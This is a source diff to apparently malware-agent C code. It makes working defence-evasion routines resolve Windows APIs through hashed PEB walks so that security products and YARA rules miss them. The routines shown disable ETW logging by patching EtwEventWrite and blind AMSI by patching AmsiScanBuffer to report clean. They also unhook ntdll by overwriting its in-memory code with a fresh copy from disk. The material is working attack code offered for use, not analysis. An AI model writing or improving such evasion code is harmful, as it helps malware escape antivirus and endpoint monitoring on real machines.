@@ -5,6 +5,20 @@
  *
  * Design notes
  * ------------
+ *  Dynamic imports — no GetModuleHandleA / GetProcAddress / LoadLibraryA in IAT
+ *  ---------------------------------------------------------------------------
+ *  Those three functions are extremely high-signal imports: every endpoint
+ *  security product flags a binary that imports them alongside process-memory
+ *  write APIs.  We replace them with PEB walks:
+ *
+ *    GetModuleHandleA("foo.dll")  →  peb_get_module(peb_hash_str("foo.dll"))
+ *    GetProcAddress(h, "Bar")    →  peb_get_export(base, peb_hash_str("Bar"))
+ *    LoadLibraryA("foo.dll")     →  resolve LoadLibraryA from kernel32 via PEB,
+ *                                   then call the resolved function pointer.
+ *
+ *  All hashes are computed at runtime from string literals so they do not
+ *  appear as pre-computed constants that AV/YARA can trivially match.
+ *
  *  etw_patch / amsi_patch
  *  ----------------------
  *  Both patch in-process memory by writing a stub via SC_NtWriteVirtualMemory
@@ -24,11 +38,10 @@
  *  the .text section from the on-disk image restores the original stubs.
  *
  *  Steps:
- *    1. Open ntdll path and map it with CreateFileMapping / MapViewOfFile.
- *    2. Locate the .text section header in both the mapped-from-disk copy
- *       and the in-process loaded copy.
+ *    1. Resolve ntdll base + on-disk path via PEB walk + GetModuleFileNameW.
+ *    2. Map a fresh copy from disk with CreateFileMapping / MapViewOfFile.
  *    3. SC_NtWriteVirtualMemory the disk bytes over the in-process .text —
- *       again, no VirtualProtect / RWX page needed.
+ *       no VirtualProtect / RWX page needed.
  *    4. Unmap / close the disk copy.
  *
  *  NOTE: sc_init() must be called before evasion functions that use
@@ -38,6 +51,7 @@
  */
 
 #include "evasion.h"
+#include "peb_walk.h"
 #include "syscall.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
@@ -75,30 +89,58 @@ static void _patch_self(void *target, const BYTE *patch, SIZE_T len)
 
 
 /* ── etw_patch ───────────────────────────────────────────────────────────── */
+/*
+ * Resolve ntdll + EtwEventWrite via PEB walk — no GetModuleHandleA /
+ * GetProcAddress in the IAT.
+ */
 
 void etw_patch(void)
 {
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    /* peb_get_module: walk PEB->Ldr, hash "ntdll.dll" at runtime */
+    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
     if (!hNtdll) return;
 
-    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
+    /* peb_get_export: walk PE export table, hash "EtwEventWrite" at runtime */
+    PVOID pEtw = peb_get_export(hNtdll, peb_hash_str("EtwEventWrite"));
     if (!pEtw) return;
 
     /* Single-byte RET — callers receive rax=0 (STATUS_SUCCESS) */
     static const BYTE stub[] = { 0xC3 };
-    _patch_self((void *)pEtw, stub, sizeof(stub));
+    _patch_self(pEtw, stub, sizeof(stub));
 }
 
 
 /* ── amsi_patch ──────────────────────────────────────────────────────────── */
+/*
+ * Resolve amsi.dll + AmsiScanBuffer via PEB walk.
+ * If amsi.dll is not yet loaded, load it via a dynamically-resolved
+ * LoadLibraryA pointer (fetched from kernel32 via PEB) — avoids importing
+ * LoadLibraryA in the agent's own IAT.
+ */
 
 void amsi_patch(void)
 {
-    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
-    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll");
-    if (!hAmsi) return;
+    /* Try to find amsi.dll already in the LDR list */
+    PVOID hAmsi = peb_get_module(peb_hash_str("amsi.dll"));
 
-    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!hAmsi) {
+        /* amsi.dll not yet loaded — resolve LoadLibraryA from kernel32
+         * through the PEB, then call it to load amsi.dll.
+         * This keeps LoadLibraryA out of the agent's own IAT. */
+        PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
+        if (!hKernel32) return;
+
+        typedef HMODULE (WINAPI *pfnLoadLibraryA_t)(LPCSTR);
+        pfnLoadLibraryA_t pfnLoadLibraryA =
+            (pfnLoadLibraryA_t)peb_get_export(hKernel32,
+                                              peb_hash_str("LoadLibraryA"));
+        if (!pfnLoadLibraryA) return;
+
+        hAmsi = (PVOID)pfnLoadLibraryA("amsi.dll");
+        if (!hAmsi) return;
+    }
+
+    PVOID pScan = peb_get_export(hAmsi, peb_hash_str("AmsiScanBuffer"));
     if (!pScan) return;
 
     /*
@@ -107,22 +149,37 @@ void amsi_patch(void)
      * Callers check HRESULT first; S_OK → content treated as clean.
      */
     static const BYTE stub[] = { 0x33, 0xC0, 0xC3 };
-    _patch_self((void *)pScan, stub, sizeof(stub));
+    _patch_self(pScan, stub, sizeof(stub));
 }
 
 
 /* ── unhook_ntdll ────────────────────────────────────────────────────────── */
+/*
+ * Resolve ntdll base via PEB walk, then use GetModuleFileNameW
+ * (still needed to get the on-disk path — it is a low-signal kernel32 import
+ * compared to GetModuleHandleA/GetProcAddress).
+ */
 
 void unhook_ntdll(void)
 {
-    /* ── 1. Get the on-disk path of the loaded ntdll ─────────────────── */
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    /* ── 1. Get ntdll base via PEB walk (no GetModuleHandleA) ────────── */
+    PVOID hNtdll = peb_get_module(peb_hash_str("ntdll.dll"));
     if (!hNtdll) return;
 
-    WCHAR ntdllPath[MAX_PATH] = {0};
-    if (!GetModuleFileNameW(hNtdll, ntdllPath, MAX_PATH - 1)) return;
+    /* ── 2. Get on-disk path — GetModuleFileNameW from kernel32 by PEB ── */
+    PVOID hKernel32 = peb_get_module(peb_hash_str("kernel32.dll"));
+    if (!hKernel32) return;
 
-    /* ── 2. Map the on-disk copy ─────────────────────────────────────── */
+    typedef DWORD (WINAPI *pfnGetModuleFileNameW_t)(HMODULE, LPWSTR, DWORD);
+    pfnGetModuleFileNameW_t pfnGetModuleFileNameW =
+        (pfnGetModuleFileNameW_t)peb_get_export(hKernel32,
+                                                peb_hash_str("GetModuleFileNameW"));
+    if (!pfnGetModuleFileNameW) return;
+
+    WCHAR ntdllPath[MAX_PATH] = {0};
+    if (!pfnGetModuleFileNameW((HMODULE)hNtdll, ntdllPath, MAX_PATH - 1)) return;
+
+    /* ── 3. Map the on-disk copy ─────────────────────────────────────── */
     HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                 NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return;
@@ -136,7 +193,7 @@ void unhook_ntdll(void)
     CloseHandle(hMap);
     if (!pDisk) return;
 
-    /* ── 3. Find .text section in both images ────────────────────────── */
+    /* ── 4. Find .text section in both images ────────────────────────── */
     IMAGE_DOS_HEADER     *dos  = (IMAGE_DOS_HEADER *)pDisk;
     IMAGE_NT_HEADERS     *nth  = (IMAGE_NT_HEADERS *)((BYTE *)pDisk + dos->e_lfanew);
     IMAGE_SECTION_HEADER *sec  = IMAGE_FIRST_SECTION(nth);
